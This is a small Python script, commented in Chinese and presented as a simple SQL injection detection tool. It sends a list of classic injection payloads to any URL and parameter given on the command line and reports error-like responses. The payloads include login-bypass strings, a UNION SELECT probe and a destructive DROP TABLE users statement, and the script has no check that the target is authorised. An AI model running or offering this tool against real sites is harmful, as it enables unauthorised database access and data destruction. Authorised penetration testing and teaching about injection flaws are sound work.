import requests
import argparse

# 常见 SQL 注入 payload
PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, NULL --",
    "1' OR '1'='1"
]

def test_sql_injection(url, param):
    print(f"[+] 开始测试目标: {url}")
    print(f"[+] 测试参数: {param}\n")
    
    for payload in PAYLOADS:
        # 构造带 payload 的请求
        data = {param: payload}
        try:
            response = requests.post(url, data=data, timeout=5)
            content = response.text.lower()
            
            # 简单判断是否存在注入特征
            if any(keyword in content for keyword in ["sql", "mysql", "syntax", "error", "exception"]):
                print(f"[!] 可能存在 SQL 注入！Payload: {payload}")
                print(f"    页面返回长度: {len(response.text)}")
            else:
                print(f"[-] Payload: {payload} 未检测到明显注入")
                
        except Exception as e:
            print(f"[-] 请求异常: {e}")
    
    print("\n[+] 测试完成！")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="简单 SQL 注入检测工具")
    parser.add_argument("-u", "--url", required=True, help="目标 URL")
    parser.add_argument("-p", "--param", default="id", help="要测试的参数名")
    args = parser.parse_args()
    
    test_sql_injection(args.url, args.param)
